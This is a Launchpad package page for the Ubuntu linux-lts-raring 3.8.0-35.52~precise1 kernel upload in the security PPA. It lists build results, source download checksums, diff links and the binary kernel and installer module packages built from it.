[Ubuntu Kernel Team](/~kernel-team)

Architectures:
all i386 amd64 armhf

Section:
devel

Urgency:
Low Urgency

## [See full publishing history](%2Bpublishinghistory) Publishing

| Series | Pocket | Published | Component | Section |
| --- | --- | --- | --- | --- |

## Builds

[Precise](/ubuntu/precise):
![[FULLYBUILT]](/@@/build-success "Successfully built")
[amd64](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538494)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[armhf](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538495)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[i386](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538496)

## Downloads

| File | Size | SHA-256 Checksum |
| --- | --- | --- |
| [linux-lts-raring\_3.8.0.orig.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/linux-lts-raring/3.8.0-35.52~precise1/linux-lts-raring_3.8.0.orig.tar.gz) | 102.1 MiB | 2148578d122c9efb130a073e0024687bfd17e35c7dea1d6fd140eecc06ab97be |
| [linux-lts-raring\_3.8.0-35.52~precise1.diff.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/linux-lts-raring/3.8.0-35.52~precise1/linux-lts-raring_3.8.0-35.52~precise1.diff.gz) | 14.9 MiB | b4b4932d77fec222fbb86fb62b1625695cc02e5129b4f3f171074663e499991a |
| [linux-lts-raring\_3.8.0-35.52~precise1.dsc](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/linux-lts-raring/3.8.0-35.52~precise1/linux-lts-raring_3.8.0-35.52~precise1.dsc) | 5.6 KiB | 7d6046ad934a92c64e8e6de4e6ce8b7ded88e914c432e8866ca533c8716fc114 |

### Available diffs

* [diff from 3.8.0-35.50~precise1 (in ~canonical-kernel-team/ubuntu/ppa) to 3.8.0-35.52~precise1](http://launchpadlibrarian.net/164410545/linux-lts-raring_3.8.0-35.50~precise1_3.8.0-35.52~precise1.diff.gz) (2.8 MiB)
* [diff from 3.8.0-35.51~precise1 to 3.8.0-35.52~precise1](http://launchpadlibrarian.net/164368944/linux-lts-raring_3.8.0-35.51~precise1_3.8.0-35.52~precise1.diff.gz) (2.4 MiB)

[View changes file](http://launchpadlibrarian.net/164368769/linux-lts-raring_3.8.0-35.52~precise1_source.changes)

## Binary packages built by this source

[block-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/block-modules-3.8.0-35-generic-di):
No summary available for block-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for block-modules-3.8.0-35-generic-di in ubuntu precise.

[crypto-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/crypto-modules-3.8.0-35-generic-di):
No summary available for crypto-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for crypto-modules-3.8.0-35-generic-di in ubuntu precise.

[fat-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/fat-modules-3.8.0-35-generic-di):
No summary available for fat-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for fat-modules-3.8.0-35-generic-di in ubuntu precise.

[fb-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/fb-modules-3.8.0-35-generic-di):
No summary available for fb-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for fb-modules-3.8.0-35-generic-di in ubuntu precise.

[firewire-core-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/firewire-core-modules-3.8.0-35-generic-di):
No summary available for firewire-core-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for firewire-core-modules-3.8.0-35-generic-di in ubuntu precise.

[floppy-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/floppy-modules-3.8.0-35-generic-di):
No summary available for floppy-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for floppy-modules-3.8.0-35-generic-di in ubuntu precise.

[fs-core-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/fs-core-modules-3.8.0-35-generic-di):
No summary available for fs-core-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for fs-core-modules-3.8.0-35-generic-di in ubuntu precise.

[fs-secondary-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/fs-secondary-modules-3.8.0-35-generic-di):
No summary available for fs-secondary-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for fs-secondary-modules-3.8.0-35-generic-di in ubuntu precise.

[input-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/input-modules-3.8.0-35-generic-di):
No summary available for input-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for input-modules-3.8.0-35-generic-di in ubuntu precise.

[ipmi-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/ipmi-modules-3.8.0-35-generic-di):
No summary available for ipmi-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for ipmi-modules-3.8.0-35-generic-di in ubuntu precise.

[irda-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/irda-modules-3.8.0-35-generic-di):
No summary available for irda-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for irda-modules-3.8.0-35-generic-di in ubuntu precise.

[kernel-image-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/kernel-image-3.8.0-35-generic-di):
No summary available for kernel-image-3.8.0-35-generic-di in ubuntu precise.

No description available for kernel-image-3.8.0-35-generic-di in ubuntu precise.

[linux-headers-3.8.0-35](/ubuntu/precise/%2Bpackage/linux-headers-3.8.0-35):
No summary available for linux-headers-3.8.0-35 in ubuntu precise.

No description available for linux-headers-3.8.0-35 in ubuntu precise.

[linux-headers-3.8.0-35-generic](/ubuntu/precise/%2Bpackage/linux-headers-3.8.0-35-generic):
No summary available for linux-headers-3.8.0-35-generic in ubuntu precise.

No description available for linux-headers-3.8.0-35-generic in ubuntu precise.

[linux-image-3.8.0-35-generic](/ubuntu/precise/%2Bpackage/linux-image-3.8.0-35-generic):
No summary available for linux-image-3.8.0-35-generic in ubuntu precise.

No description available for linux-image-3.8.0-35-generic in ubuntu precise.

[linux-tools-3.8.0-35](/ubuntu/precise/%2Bpackage/linux-tools-3.8.0-35):
No summary available for linux-tools-3.8.0-35 in ubuntu precise.

No description available for linux-tools-3.8.0-35 in ubuntu precise.

[md-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/md-modules-3.8.0-35-generic-di):
No summary available for md-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for md-modules-3.8.0-35-generic-di in ubuntu precise.

[message-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/message-modules-3.8.0-35-generic-di):
No summary available for message-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for message-modules-3.8.0-35-generic-di in ubuntu precise.

[mouse-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/mouse-modules-3.8.0-35-generic-di):
No summary available for mouse-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for mouse-modules-3.8.0-35-generic-di in ubuntu precise.

[multipath-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/multipath-modules-3.8.0-35-generic-di):
No summary available for multipath-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for multipath-modules-3.8.0-35-generic-di in ubuntu precise.

[nfs-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/nfs-modules-3.8.0-35-generic-di):
No summary available for nfs-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for nfs-modules-3.8.0-35-generic-di in ubuntu precise.

[nic-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/nic-modules-3.8.0-35-generic-di):
No summary available for nic-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for nic-modules-3.8.0-35-generic-di in ubuntu precise.

[nic-pcmcia-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/nic-pcmcia-modules-3.8.0-35-generic-di):
No summary available for nic-pcmcia-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for nic-pcmcia-modules-3.8.0-35-generic-di in ubuntu precise.

[nic-shared-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/nic-shared-modules-3.8.0-35-generic-di):
No summary available for nic-shared-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for nic-shared-modules-3.8.0-35-generic-di in ubuntu precise.

[nic-usb-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/nic-usb-modules-3.8.0-35-generic-di):
No summary available for nic-usb-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for nic-usb-modules-3.8.0-35-generic-di in ubuntu precise.

[parport-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/parport-modules-3.8.0-35-generic-di):
No summary available for parport-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for parport-modules-3.8.0-35-generic-di in ubuntu precise.

[pata-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/pata-modules-3.8.0-35-generic-di):
No summary available for pata-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for pata-modules-3.8.0-35-generic-di in ubuntu precise.

[pcmcia-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/pcmcia-modules-3.8.0-35-generic-di):
No summary available for pcmcia-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for pcmcia-modules-3.8.0-35-generic-di in ubuntu precise.

[pcmcia-storage-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/pcmcia-storage-modules-3.8.0-35-generic-di):
No summary available for pcmcia-storage-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for pcmcia-storage-modules-3.8.0-35-generic-di in ubuntu precise.

[plip-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/plip-modules-3.8.0-35-generic-di):
No summary available for plip-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for plip-modules-3.8.0-35-generic-di in ubuntu precise.

[ppp-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/ppp-modules-3.8.0-35-generic-di):
No summary available for ppp-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for ppp-modules-3.8.0-35-generic-di in ubuntu precise.

[sata-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/sata-modules-3.8.0-35-generic-di):
No summary available for sata-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for sata-modules-3.8.0-35-generic-di in ubuntu precise.

[scsi-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/scsi-modules-3.8.0-35-generic-di):
No summary available for scsi-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for scsi-modules-3.8.0-35-generic-di in ubuntu precise.

[serial-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/serial-modules-3.8.0-35-generic-di):
No summary available for serial-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for serial-modules-3.8.0-35-generic-di in ubuntu precise.

[speakup-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/speakup-modules-3.8.0-35-generic-di):
No summary available for speakup-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for speakup-modules-3.8.0-35-generic-di in ubuntu precise.

[squashfs-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/squashfs-modules-3.8.0-35-generic-di):
No summary available for squashfs-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for squashfs-modules-3.8.0-35-generic-di in ubuntu precise.

[storage-core-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/storage-core-modules-3.8.0-35-generic-di):
No summary available for storage-core-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for storage-core-modules-3.8.0-35-generic-di in ubuntu precise.

[usb-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/usb-modules-3.8.0-35-generic-di):
No summary available for usb-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for usb-modules-3.8.0-35-generic-di in ubuntu precise.

[virtio-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/virtio-modules-3.8.0-35-generic-di):
No summary available for virtio-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for virtio-modules-3.8.0-35-generic-di in ubuntu precise.

[vlan-modules-3.8.0-35-generic-di](/ubuntu/precise/%2Bpackage/vlan-modules-3.8.0-35-generic-di):
No summary available for vlan-modules-3.8.0-35-generic-di in ubuntu precise.

No description available for vlan-modules-3.8.0-35-generic-di in ubuntu precise.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


